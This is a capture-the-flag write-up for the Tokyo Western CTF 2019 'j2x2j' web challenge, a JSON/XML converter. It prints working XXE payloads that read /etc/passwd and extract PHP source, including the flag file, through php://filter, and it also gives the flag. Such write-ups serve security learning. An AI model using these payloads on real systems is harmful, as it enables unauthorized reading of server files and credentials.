# Tokyo Western CTF - 2019
###### Contributed by FI

## j2x2j - 59 / Web

> http://j2x2j.chal.ctf.westerns.tokyo/

### Solution
As the title "JSON <-> XML Converter" says, it is a simple json to xml and xml to json converter.
![](https://i.imgur.com/XJKllxI.png)
So I guess it is a XXE and I test it.
```
<?xml version="1.0"?><!DOCTYPE root [<!ENTITY test SYSTEM 'file:///etc/passwd'>]><root>&test;</root>
```
![](https://i.imgur.com/gxkPtYI.png)
XXE confirmed!

Let's get the source first using php filter.
```
<?xml version="1.0"?><!DOCTYPE root [<!ENTITY test SYSTEM 'php://filter/convert.base64-encode/resource=index.php'>]><root>&test;</root>
```
We can see the flag is at flag.php after decoding it with base64.
```
<?php
include 'flag.php';
...
```
Finally we can get the flag.

```
<?xml version="1.0"?><!DOCTYPE root [<!ENTITY test SYSTEM 'php://filter/convert.base64-encode/resource=flag.php'>]><root>&test;</root>
```
After decoding it.
```
<?php
$flag = 'TWCTF{t1ny_XXE_st1ll_ex1sts_everywhere}';
```

### Flag
`TWCTF{t1ny_XXE_st1ll_ex1sts_everywhere}`
